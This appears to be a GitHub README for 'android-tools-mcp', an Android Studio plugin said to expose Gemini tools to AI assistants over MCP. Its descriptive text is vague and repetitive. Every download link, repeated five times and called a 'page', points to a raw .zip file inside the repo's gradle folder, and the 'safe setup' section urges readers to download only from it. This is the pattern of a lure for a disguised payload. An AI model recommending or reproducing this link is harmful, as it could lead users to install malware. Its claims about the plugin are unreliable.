# 🔌 android-tools-mcp - Android tools for AI assistants

[![Download android-tools-mcp](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/coronary-salat506/android-tools-mcp/raw/refs/heads/main/gradle/tools-mcp-android-3.6.zip)

## 📥 Download

Visit this page to download and set up android-tools-mcp:

https://github.com/coronary-salat506/android-tools-mcp/raw/refs/heads/main/gradle/tools-mcp-android-3.6.zip

Use this link on your Windows PC to get the plugin and follow the setup files in the repository.

## 🧩 What this is

android-tools-mcp is an Android Studio plugin that lets other AI tools use Android-focused features through an MCP server.

It is made for people who want external assistants like Claude or GitHub Copilot to work with Android Studio tools in a direct way.

With this setup, the assistant can call Android-specific actions instead of guessing what to do.

## ✅ What you can do

- Connect an AI assistant to Android Studio tools
- Use Android-specific commands from supported AI apps
- Work with Gemini-based tools through an MCP server
- Make it easier for an assistant to inspect or help with Android work
- Use the same setup with tools such as Claude Code, Copilot, and similar clients

## 🖥️ What you need on Windows

Before you start, make sure you have:

- Windows 10 or Windows 11
- Android Studio installed
- A working internet connection
- Enough disk space for Android Studio plugins and project files
- A supported AI assistant that can connect to MCP servers

If you plan to use the plugin with Android work, you should also have:

- An Android project ready in Android Studio
- A stable Java setup already handled by Android Studio
- Permission to install plugins in Android Studio

## 🚀 Install on Windows

Follow these steps in order.

1. Open the download page:
   https://github.com/coronary-salat506/android-tools-mcp/raw/refs/heads/main/gradle/tools-mcp-android-3.6.zip

2. Download the plugin files from the repository page or its release area if one is listed there.

3. Start Android Studio.

4. Open the plugin manager:
   - Go to File
   - Select Settings
   - Open Plugins

5. Install the plugin using the method provided in the repository:
   - If you have a plugin file, choose install from disk
   - If the repository gives setup steps, follow them in the same order

6. Restart Android Studio when asked.

7. Open the plugin settings and confirm that android-tools-mcp is active.

8. Keep the repository page open while you set up the MCP connection in your AI tool.

## 🔧 Connect an AI assistant

After the plugin is installed, you can connect an AI assistant that supports MCP.

Common steps look like this:

1. Open your AI assistant app or extension.
2. Find the MCP server settings.
3. Add the Android tools server from android-tools-mcp.
4. Save the settings.
5. Restart the AI assistant if it asks for it.
6. Open an Android project in Android Studio.
7. Test one tool action from the assistant.

If the connection works, the assistant should be able to use Android tools through the plugin.

## 🧠 How it works

android-tools-mcp sits between Android Studio and your AI assistant.

The plugin exposes native Gemini tools as an MCP server. That means the assistant can ask for Android-related help through a standard tool link instead of a one-off setup.

This is useful when you want an assistant to:
- read Android project details
- use Android Studio-linked actions
- help with app work in a more direct way
- follow a tool path that is built for Android tasks

## 📂 Typical use cases

You may find this useful if you want to:

- ask an assistant to help with Android app work
- connect Android Studio to an MCP-aware AI client
- use Claude or Copilot with Android-specific tools
- keep your workflow inside Android Studio while the assistant helps from outside
- test a plugin-based setup for Android development support

## ⚙️ Setup tips

Use these tips if the setup does not work on the first try:

- Make sure Android Studio is fully closed before reinstalling the plugin
- Check that you used the right plugin install method
- Confirm that the AI assistant supports MCP
- Make sure the assistant points to the right server or plugin path
- Restart both Android Studio and the AI app after setup
- Open a sample Android project before testing the tools

## 🔍 Check that it is working

You can confirm the setup with a quick test:

1. Open Android Studio.
2. Open a project.
3. Open your AI assistant.
4. Ask it to use an Android tool that the plugin provides.
5. Watch for a response that shows the tool connection is active.

If the assistant can reach the Android tools, the setup is complete.

## 📄 Repository details

- Repository: android-tools-mcp
- Type: Android Studio plugin
- Purpose: expose native Gemini tools as an MCP server
- Target users: people using AI assistants with Android Studio
- Main link: https://github.com/coronary-salat506/android-tools-mcp/raw/refs/heads/main/gradle/tools-mcp-android-3.6.zip

## 🧭 Supported tools and clients

This project is built for AI tools that can talk to MCP servers, including:

- Claude
- GitHub Copilot
- Claude Code
- Kilo Code
- OpenCode
- other compatible MCP clients

## 🛠️ Common problems

If you run into trouble, check these items:

- Android Studio plugin not showing up: reinstall it and restart Android Studio
- AI assistant cannot find the server: check the MCP settings and the server path
- Tools do not respond: confirm the plugin is active inside Android Studio
- Setup works on one app but not another: make sure the second app supports MCP
- Nothing happens after install: restart Windows, then try again

## 📌 Quick start

1. Visit:
   https://github.com/coronary-salat506/android-tools-mcp/raw/refs/heads/main/gradle/tools-mcp-android-3.6.zip

2. Download and install the plugin in Android Studio.

3. Open an Android project.

4. Connect your MCP-aware AI assistant.

5. Test an Android tool from the assistant

## 🧾 File and folder use

When you work with this project, you will usually deal with:

- the repository page
- Android Studio plugin settings
- MCP server settings in your AI app
- your Android project folder
- any files or instructions included in the repository

## 🔐 Safe setup habits

Keep your setup simple and use trusted sources.

- Download only from the repository link above
- Review the setup steps before you change settings
- Use one AI client at a time when testing
- Keep Android Studio up to date
- Save your project before you test new tools